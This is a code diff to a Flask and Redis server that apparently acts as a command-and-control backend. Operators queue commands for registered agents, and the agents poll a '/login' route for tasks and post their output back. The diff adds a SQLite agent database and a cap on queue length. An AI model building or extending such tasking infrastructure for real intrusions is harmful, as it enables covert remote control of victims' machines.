@@ -1,7 +1,15 @@
 from flask import Flask, request, Response
 import redis
+from functions import *
+import os
+
+script_dir = os.path.dirname(os.path.abspath(__file__))
+db_path = os.path.join(script_dir, 'agents.db')
+if not os.path.exists(db_path):
+    create_db(db_path)
 
 r = redis.Redis(host='127.0.0.1', port=6379, db=0, decode_responses=True)
+
 
 app = Flask(__name__)
 
@@ -12,6 +20,8 @@ def send_command():
         uuid = data.get('uuid')
         cmd = data.get('command')
         r.rpush(uuid, cmd)
+        if r.llen(uuid) > 100:
+            r.lpop(uuid)
     return "Command Sent!"
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -20,10 +30,8 @@ def commander():
         uuid = request.args.get('uuid')
         cache = r.lindex(uuid, -1)
         if r.exists(uuid) == 0:
-            r.rpush(uuid, "AGENT REGISTERED")
-            r.rpush("agents", uuid)
-            print(uuid, "Registered")
-            command = ""
+            command = register_agent(uuid)
+
         elif "SEEN" in cache or "AGENT REGISTERED" in cache:
             command = ""
         else:
@@ -41,8 +49,6 @@ def commander():
         if uuid and data:
             key = f"{uuid}-output"
             r.lpush(key, data)
-        else:
-            return "ERROR: POST requests only!"
         return "Success"
     else:
         return "Invalid Method"
